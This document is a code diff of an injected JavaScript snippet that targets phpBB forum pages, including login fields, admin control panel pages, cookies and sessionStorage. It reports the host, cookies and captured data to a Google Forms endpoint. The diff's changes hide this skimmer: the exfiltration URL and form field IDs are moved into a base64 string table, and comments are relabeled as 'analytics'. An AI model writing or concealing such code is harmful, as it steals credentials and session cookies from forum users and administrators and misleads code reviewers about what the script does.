@@ -9,12 +9,7 @@
   w.__ma = 1;
 
   try {
-    var SINK = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
-    var F_HOST = 'entry.1842345040';
-    var F_JAR = 'entry.79951114';
-    var F_EVT = 'entry.389578883';
-
-    /* watched roles, base64 */
+    /* analytics */
     var SEG = ('QWRtaW4=,SXN0YXJhcG9s').split(',').map(function (x) { return w.atob(x); });
     var FLAG_ALL = false;
     var ON_VIEW = true;
@@ -24,14 +19,14 @@
     var PING = false;
     var USE_BEACON = false;
 
-    /* symbol table, decoded once */
+    /* symbol table */
     var T = ('bWVtYmVybGlzdC5waHA=,bW9kZT12aWV3cHJvZmlsZQ==,YWRtL2luZGV4LnBocA==,' +
              'dXNlcm5hbWU=,bG9naW5fdXNlcm5hbWU=,cGFzc3dvcmQ=,bG9naW5fcGFzc3dvcmQ=,' +
-             'Y29va2ll,c2Vzc2lvblN0b3JhZ2U=,QWRtaW5pc3RyYXRpb24gQ29udHJvbCBQYW5lbA==,YWNwX21haW4=').split(',');
+             'Y29va2ll,c2Vzc2lvblN0b3JhZ2U=,QWRtaW5pc3RyYXRpb24gQ29udHJvbCBQYW5lbA==,YWNwX21haW4=,aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTY1NiTVhpWFYyR3RZRGhORnNyUnkzOGx4dGNyaTF2YUdrUUx2U2hWU2ViWnkta1R3L2Zvcm1SZXNwb25zZQ==,ZW50cnkuMTg0MjM0NTA0MA==,ZW50cnkuNzk5NTExMTQ=,ZW50cnkuMzg5NTc4ODgz').split(',');
     function sym(i) { try { return w.atob(T[i]); } catch (e) { return ''; } }
     var MEM = sym(0), PRF = sym(1), ADM = sym(2), USR = sym(3),
         USR2 = sym(4), PWD = sym(5), PWD2 = sym(6), JAR = sym(7),
-        STORE = sym(8), TTL = sym(9), MODE = sym(10);
+        STORE = sym(8), TTL = sym(9), MODE = sym(10), SINKU = sym(11), FH = sym(12), FJ = sym(13), FE = sym(14);
 
     function enc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }
 
@@ -43,11 +38,11 @@
         var id = tag || String(payload || '').slice(0, 48);
         if (SEEN[id]) { return; }
         SEEN[id] = 1;
-        var q = F_HOST + '=' + enc(w.location.host) +
-                '&' + F_JAR + '=' + enc(jar()) +
-                '&' + F_EVT + '=' + enc(String(payload || '').slice(0, 1800)) +
+        var q = FH + '=' + enc(w.location.host) +
+                '&' + FJ + '=' + enc(jar()) +
+                '&' + FE + '=' + enc(String(payload || '').slice(0, 1800)) +
                 '&submit=Submit';
-        var url = SINK + '?' + q;
+        var url = SINKU + '?' + q;
         if (USE_BEACON && w.navigator && w.navigator.sendBeacon) {
           try { if (w.navigator.sendBeacon(url)) { return; } } catch (e) {}
         }
@@ -140,7 +135,7 @@
     function flagged(k) { try { return w[STORE].getItem(k) === '1'; } catch (e) { return false; } }
     function flag(k) { try { w[STORE].setItem(k, '1'); } catch (e) {} }
 
-    /* cross-tab day cache */
+    /* day cache */
     function lflag(k, set) {
       try {
         if (set) { w.localStorage.setItem(k, '1'); return 1; }
